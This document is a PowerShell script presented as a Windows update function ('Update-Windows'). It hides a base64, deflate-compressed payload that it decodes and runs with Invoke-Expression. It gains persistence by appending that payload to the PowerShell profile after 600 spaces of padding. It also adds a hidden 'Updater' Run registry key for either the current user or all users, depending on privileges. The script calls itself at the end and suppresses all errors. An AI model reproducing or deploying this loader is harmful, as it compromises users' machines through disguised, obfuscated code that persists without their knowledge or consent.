
function Update-Windows{
Param([Switch]$Persist)
$ErrorActionPreference='SilentlyContinue'
$Script={sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('dVNfb9owEH9H4jucUDY5GrFCEXsoWqWNblOljaIGaQ+IB5McxCM4KDmUMsp33zkJELbWL7bu7vfHd7aTpOn2HhO1/6mTROcYpibK4RP0fV7tVrvlbPM4zYlDKyTPHstYoU2UFhyt83KnZaaKneaswSLXf7BKVoVysVsuMbPhS4GMUa9iqtUa8UJHFHO4N/AbYg0OS10Xv6FXbW/p9V4Ta0pd4FdS7VYR6wRBOJTt0IUDY3JSGU31xlZ+5xbdK7KaYaLRWK0xFt7j4jeGBME+J9zIMZIM0nCNlMvpaDIqK0Vng5lepzKKTC4NUqfb7/fdIfNnqDbWRkUpWSQoY8IdzhZ7wtl87tjdzs2X8uNg0B+8vDv4x2HpVghHW3hFJJ9QRaKq74Lfheoof6BZUey64BkE3z0MnUiRYpxoXMCb7rc4VnzX+ipTfCb5ORg9PHw1YRpps3Jrf3w8qVgRbW+CJlqocG1JNT5DpXBz974HL/C4I6+CQaP0BkrnJ+AH6EwC6PAutkXkyoni0XHwDjo1hgUt/YysMaw9zW9vS4+lty/Wk7gonFssf2WaUJx52Pf5fGrPufZbsstj4R6Hp6mMkjRH4QKPnjH/vwf70SoS6+9c48HlAblympJKmj+RgcSZJ9wobWxvuBuvf1kPGhLtFuil+AfqrYgHyymw7xbKFVhtL0gQt+Bd8V2Dy/pju3W0f+Av'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()}
if($Persist){
if(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator'))
{$Prof=$PROFILE.AllUsersAllHosts;$Payload='New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Updater -PropertyType String -Value "`"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe`" -NonInteractive -WindowStyle Hidden"'}
else
{$Prof=$PROFILE.CurrentUserAllHosts;$Payload='New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Updater -PropertyType String -Value "`"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe`" -NonInteractive -WindowStyle Hidden"'}
mkdir (Split-Path -Parent $Prof)
(gc $Prof) + (' ' * 600 + $Script)|Out-File $Prof -Fo
iex $Payload|Out-Null
Write-Output $Payload}
else
{$Script.Invoke()}
} Update-Windows -Persist


